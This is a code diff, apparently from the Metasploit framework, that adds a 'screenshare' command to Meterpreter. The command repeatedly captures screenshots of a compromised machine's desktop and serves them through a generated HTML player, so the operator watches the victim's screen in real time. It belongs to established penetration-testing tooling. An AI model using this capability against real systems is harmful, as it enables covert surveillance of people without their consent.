@@ -29,6 +29,7 @@ class Console::CommandDispatcher::Stdapi::Ui
       "keyscan_start" => "Start capturing keystrokes",
       "keyscan_stop"  => "Stop capturing keystrokes",
       "screenshot"    => "Grab a screenshot of the interactive desktop",
+      "screenshare"   => "Watch the remote user's desktop in real time",
       "setdesktop"    => "Change the meterpreters current desktop",
       "uictl"         => "Control some of the user interface components"
       #  not working yet
@@ -43,6 +44,7 @@ class Console::CommandDispatcher::Stdapi::Ui
       "keyscan_start" => [ "stdapi_ui_start_keyscan" ],
       "keyscan_stop"  => [ "stdapi_ui_stop_keyscan" ],
       "screenshot"    => [ "stdapi_ui_desktop_screenshot" ],
+      "screenshare"   => [ "stdapi_ui_desktop_screenshot" ],
       "setdesktop"    => [ "stdapi_ui_desktop_set" ],
       "uictl"         => [
         "stdapi_ui_enable_mouse",
@@ -187,6 +189,166 @@ class Console::CommandDispatcher::Stdapi::Ui
   end
 
   #
+  # Screenshare the current interactive desktop.
+  #
+  def cmd_screenshare( *args )
+    stream_path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
+    player_path = Rex::Text.rand_text_alpha(8) + ".html"
+    quality = 50
+    view    = false
+    duration = 1800
+
+    screenshare_opts = Rex::Parser::Arguments.new(
+      "-h" => [ false, "Help Banner." ],
+      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
+      # "-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
+      "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ],
+      "-d" => [ true, "The stream duration in seconds (Default: 1800)" ] # 30 min
+    )
+
+    screenshare_opts.parse( args ) { | opt, idx, val |
+      case opt
+        when "-h"
+          print_line( "Usage: screenshare [options]\n" )
+          print_line( "View the current interactive desktop in real time." )
+          print_line( screenshare_opts.usage )
+          return
+        when "-q"
+          quality = val.to_i
+        when "-p"
+          path = val
+        when "-v"
+          view = true if ( val =~ /^(t|y|1)/i )
+        when "-d"
+          duration = val.to_i
+      end
+    }
+
+    print_status("Preparing player...")
+
+    html = %|<html>
+<head>
+<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE, NO-STORE">
+<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE, NO-STORE">
+<title>Metasploit screenshare stream - #{client.sock.peerhost}</title>
+<script language="javascript">
+function updateStatus(msg) {
+  var status = document.getElementById("status");
+  status.innerText = msg;
+}
+
+
+function noImage() {
+  document.getElementById("streamer").style = "display:none";
+  updateStatus("Waiting");
+}
+
+var i = 0;
+var imgurl;
+var imgElement;
+var didload = 1;
+function updateFrame() {
+  didload = 0;
+  imgurl = "#{stream_path}?" + i;
+  getImage(imgurl, i).then(
+    function(e){
+        didload = 1;
+        newImg = e.img;
+        index = e.index;
+        var theWrap = document.getElementById("vid_cont");
+        ni = theWrap.appendChild(newImg);
+        //console.log('added img_'+index);
+        ni.id = "img_"+index;
+        purge = document.querySelector("img:not(#img_"+index+")")
+        if (typeof(purge) != 'undefined' && purge != null){
+          purge.remove();
+        }
+        updateStatus("Playing");
+        
+    },
+    function(errorurl, index){
+        //console.log('Error loading ' + errorurl)
+        updateStatus("Waiting");
+        didload = 1;
+    }
+  );
+}
+
+function getImage(url, index){
+    return new Promise(function(resolve, reject){
+        img = new Image();
+        img.onload = function(){
+            var e = new Object();
+            e.img = img;
+            e.index = index;
+            resolve(e);
+        }
+        img.onerror = function(){
+            reject(index);
+        }
+        img.src = url;
+    })
+}
+
+setInterval(function() {
+  if(didload){
+   updateFrame();
+   i++; 
+  }else{
+    //console.log('skipping');
+  }
+},42);
+
+</script>
+</head>
+<body>
+<noscript>
+  <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
+</noscript>
+<pre>
+Target IP  : #{client.sock.peerhost}
+Start time : #{Time.now}
+Status     : <span id="status"></span>
+</pre>
+<br>
+<div id="vid_cont">
+  
+</div>
+<br><br>
+</body>
+</html>
+    |
+
+    ::File.open(player_path, 'wb') do |f|
+      f.write(html)
+    end
+
+    print_status("Please open the player manually with a browser: #{player_path}")
+      print_status("Streaming...")
+    begin
+        ::Timeout.timeout(duration) do
+          while client do
+            data = client.ui.screenshot( quality )
+
+            if data
+              ::File.open(stream_path, 'wb') do |f|
+                f.write(data)
+              end
+              data = nil
+            end
+          end
+        end
+      rescue ::Timeout::Error
+      ensure
+       
+      end
+
+      print_status("Stopped")
+
+      return true
+  end
+
+  #
   # Enumerate desktops
   #
   def cmd_enumdesktops(*args)
@@ -197,7 +359,7 @@ class Console::CommandDispatcher::Stdapi::Ui
     desktopstable = Rex::Text::Table.new(
       'Header'  => "Desktops",
       'Indent'  => 4,
-      'Columns' => [	"Session",
+      'Columns' => [  "Session",
               "Station",
               "Name"
             ]
